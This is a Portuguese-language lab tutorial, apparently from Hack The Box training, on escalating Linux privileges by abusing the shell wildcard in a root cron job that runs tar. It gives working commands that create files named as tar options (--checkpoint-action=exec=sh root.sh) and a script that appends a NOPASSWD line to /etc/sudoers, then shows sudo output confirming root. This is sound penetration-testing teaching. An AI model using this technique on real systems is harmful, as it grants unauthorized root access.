# Abuso de Wildcard

Um caractere curinga (wildcard) pode ser usado como substituto de outros caracteres e é interpretado pelo shell antes de outras ações. Exemplos de wildcards:

| Caractere | Significado |
|---|---|
| `*` | Asterisco que pode corresponder a qualquer número de caracteres em um nome de arquivo. |
| `?` | Corresponde a um único caractere. |
| `[ ]` | Colchetes envolvem caracteres e podem corresponder a qualquer caractere único na posição definida. |
| `~` | Til no início expande para o diretório home do usuário atual, ou pode receber outro nome de usuário para referenciar o home desse usuário. |
| `-` | Hífen dentro de colchetes representa um intervalo de caracteres. |

Um exemplo de como wildcards podem ser abusados para escalada de privilégios é com o comando `tar`, programa comum para criar/extrair arquivos compactados. Se olharmos a man page do `tar`, vemos:

```bash
htb_student@NIX02:~$ man tar
```

```text
<SNIP>
Informative output
       --checkpoint[=N]
              Display progress messages every Nth record (default 10).

       --checkpoint-action=ACTION
              Run ACTION on each checkpoint.
```

A opção `--checkpoint-action` permite executar uma ação `EXEC` quando um checkpoint é atingido (ou seja, executar um comando arbitrário do sistema operacional quando o `tar` roda). Criando arquivos com esses nomes, quando o wildcard for usado, `--checkpoint=1` e `--checkpoint-action=exec=sh root.sh` serão passados para o `tar` como opções de linha de comando. Vamos ver isso na prática.

Considere o cron job abaixo, configurado para fazer backup do conteúdo de `/home/htb-student` e criar um arquivo compactado dentro de `/home/htb-student`. Como ele roda a cada minuto, é um bom candidato para escalada de privilégios.

```bash
#
#
mh dom mon dow command
*/01 * * * * cd /home/htb-student && tar -zcf /home/htb-student/backup.tar.gz *
```

Podemos abusar do wildcard nesse cron job criando nomes de arquivo que representem os comandos necessários. Quando o cron rodar, esses nomes serão interpretados como argumentos e executarão os comandos que definirmos.

```bash
htb-student@NIX02:~$ echo 'echo "htb-student ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb-student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb-student@NIX02:~$ echo "" > --checkpoint=1
```

Podemos verificar se os arquivos necessários foram criados:

```bash
htb-student@NIX02:~$ ls -la
```

```text
total 56
drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint=1
-rw-rw-r--  1 htb-student htb-student    1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
-rw-rw-r--  1 htb-student htb-student   60 Aug 31 23:11 root.sh
```

Depois que o cron job rodar novamente, podemos verificar os privilégios adicionados e usar sudo para virar root diretamente.

```bash
htb-student@NIX02:~$ sudo -l
```

```text
Matching Defaults entries for htb-student on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User htb-student may run the following commands on NIX02:
    (root) NOPASSWD: ALL
```
